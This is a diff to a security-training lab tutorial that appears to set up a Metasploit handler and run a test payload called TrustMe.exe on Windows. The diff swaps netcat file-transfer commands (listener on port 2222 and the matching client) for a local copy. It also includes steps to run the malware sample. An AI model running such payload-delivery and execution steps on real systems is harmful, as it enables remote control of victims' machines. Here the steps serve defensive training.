@@ -55,7 +55,7 @@ Please note, the adhd password is adhd.
 /#`ls -l TrustMe.exe`
 
 
-/#`nc -l -p 2222 < TrustMe.exe`
+/#`cp ./TrustMe.exe /mnt/c/tools`
 
 
 Now, let's start the Metasploit Handler.  First, open a new Ubuntu Terminal by clicking the down carrot then selecting Ubuntu-18.04.
@@ -88,11 +88,9 @@ Now, let’s download the malware and run it!
 
 First, let's open a Windows command prompt.  Simply select the down carrot from the Windows Terminal and select Command Prompt.
 
-Once the prompt is open, let's run the following commands to copy over and run the TrustMe.exe file.
+Once the prompt is open, let's run the following commands to run the TrustMe.exe file.
 
 `cd \tools`
-
-`nc <Your Linux IP> 2222 > TrustMe.exe`
 
 Take a deep breath.  Count to 5.  Then hit Ctrl+c to kill the connection.
 
